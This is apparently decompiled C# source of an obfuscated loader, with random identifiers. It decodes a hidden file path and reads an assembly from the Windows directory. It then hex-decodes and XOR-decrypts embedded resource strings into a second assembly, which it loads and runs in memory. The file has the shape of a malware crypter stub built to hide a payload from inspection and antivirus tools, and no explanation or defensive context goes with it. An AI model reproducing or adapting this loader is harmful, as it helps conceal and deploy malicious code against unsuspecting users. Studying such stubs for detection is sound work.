using System;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using Classes;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace iUsRxYmTcG;

public class jOjSgNgYyF
{
	public static Type _type;

	public static object inz;

	[STAThread]
	public static void Main()
	{
		string text = "èŰŜƤƸƐƼǜǌŰĴƤƌǈƼǌƼƘǐ\u00b8ĸĔŐŰĘǈƄƴƔǜƼǈƬŰǘÈ\u00b8À\u00b8ÔÀÜÈÜŰƴǌƌƼǈưƤƈ\u00b8Ɛưư";
		string text2 = null;
		checked
		{
			int num = text.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				text2 += Conversions.ToString(Strings.ChrW((int)Math.Round((double)unchecked((int)text[i]) / 4.0)));
			}
			text = text2;
			string systemDirectory = Environment.SystemDirectory;
			string path = Conversions.ToString(systemDirectory[0]) + text;
			byte[] rawAssembly = File.ReadAllBytes(path);
			Assembly assembly = Assembly.Load(rawAssembly);
			object[] args = new object[2]
			{
				"nExCpNlMeQ",
				Assembly.GetExecutingAssembly()
			};
			string text3 = null;
			int bindingAttr = 566;
			string text4 = "System.Resources.ResourceManager";
			int num2 = 0;
			bool[] array3;
			do
			{
				object[] activationAttributes = new object[0];
				string text5 = "sTtIdIxDrN" + Conversions.ToString(num2);
				Binder binder = null;
				CultureInfo culture = null;
				string text6 = text3;
				object? obj = assembly.CreateInstance(text4, ignoreCase: true, unchecked((BindingFlags)bindingAttr), binder, args, culture, activationAttributes);
				object[] array = new object[1] { text5 };
				object[] array2 = array;
				array3 = new bool[1] { true };
				object obj2 = NewLateBinding.LateGet(obj, (Type)null, "GetString", array2, (string[])null, (Type[])null, array3);
				if (array3[0])
				{
					text5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				text3 = Conversions.ToString(Operators.ConcatenateObject((object)text6, obj2));
				num2++;
			}
			while (num2 <= 14);
			byte[] array4 = new byte[12289];
			int num3 = 0;
			int num4 = text3.Length - 1;
			int num5;
			for (num5 = 0; num5 <= num4; num5++)
			{
				string text7 = Conversions.ToString(text3[num5]) + Conversions.ToString(text3[num5 + 1]);
				double num6 = 0.0;
				int num7 = text7.Length - 1;
				for (int j = 0; j <= num7; j++)
				{
					num6 = ((text7[j] <= '@') ? (num6 + (double)(unchecked((int)text7[j]) - 48) * Math.Pow(16.0, text7.Length - j - 1)) : (num6 + (double)(unchecked((int)text7[j]) - 55) * Math.Pow(16.0, text7.Length - j - 1)));
				}
				array4[num3] = (byte)Math.Round(num6);
				num3++;
				num5++;
			}
			string text8 = "eRaSfGlKvL";
			Binder binder2 = null;
			object[] activationAttributes2 = new object[0];
			CultureInfo culture2 = null;
			string typeName = text4;
			text4 = null;
			object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(typeName, ignoreCase: true, unchecked((BindingFlags)bindingAttr), binder2, args, culture2, activationAttributes2));
			object[] array5 = new object[1] { text8 };
			object[] array6 = array5;
			array3 = new bool[1] { true };
			object obj3 = NewLateBinding.LateGet(objectValue, (Type)null, "GetString", array6, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				text8 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array5[0]), typeof(string));
			}
			string text9 = Conversions.ToString(obj3);
			byte[] array7 = new byte[20];
			int num8 = text9.Length - 1;
			for (int k = 0; k <= num8; k++)
			{
				char c = Conversions.ToChar(Strings.StrReverse(Conversions.ToString(text9[k])));
				array7[k] = (byte)unchecked((int)c);
			}
			int num9 = array4.Length - 1;
			int num10 = num9 * 8;
			int num11 = num10;
			for (int l = 0; l <= num11; l++)
			{
				int num12;
				int num20;
				unchecked
				{
					num12 = l % array4.Length;
					int num13 = l % array7.Length;
					int num14 = array4[num12] ^ array7[num13];
					int num15 = checked(l + 1);
					int num16 = num15 % array4.Length;
					int num17 = num14;
					int num18 = array4[num16];
					int num19 = checked(num17 - num18 + 256);
					num20 = num19 % 256;
				}
				byte b = (array4[num12] = (byte)num20);
			}
			Assembly assembly2 = Assembly.Load(array4);
			_type = assembly2.GetType("A.A");
			inz = null;
			inz = RuntimeHelpers.GetObjectValue(assembly2.CreateInstance(Strings.StrReverse("A.A")));
			new Eax2(new object[0]);
		}
	}
}
